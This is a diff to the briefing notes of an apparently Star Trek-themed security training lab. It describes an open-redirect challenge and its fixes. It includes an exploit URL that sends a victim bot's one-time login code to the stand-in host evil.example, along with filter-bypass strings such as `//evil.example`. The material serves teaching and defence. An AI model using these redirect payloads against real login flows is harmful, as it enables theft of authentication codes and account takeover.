@@ -329,12 +329,13 @@ suggestions. *Premise* is a one-line summary; the full briefing is in
 - *Vulnerable:* `GET /login/continue?returnUrl=` redirects to `returnUrl` with a
   one-time `code` appended (mobile app handoff).
 - *Victim bot:* `POST /support/messages { "link": ... }` makes Riker follow the
-  link. Anything landing on `https://evil.example` shows up in `GET /attacker/inbox`.
+  link, but only if it points at the ship (`https://enterprise.local/…`, `localhost` or a
+  relative path). Anything landing on `https://evil.example` shows up in `GET /attacker/inbox`.
 - *Flag:* Riker's `code`. *Exploit:* send Riker
   `/api/labs/open-redirect/login/continue?returnUrl=https://evil.example/`.
 - ✅ `Url.IsLocalUrl(returnUrl)` / `Results.LocalRedirect`, fallback to `/`
 - ❌ `StartsWith("/")` (`//evil.example`) · ❌ `Contains("enterprise.local")`
-  (`enterprise.local.evil.example`) · ❌ URL-encode `returnUrl`
+  (`enterprise.local.evil.example`) · ❌ Remove `https://` / `http://` (`//evil.example`)
 
 ### Act 3 — "Into the Core" (v1.2)
 
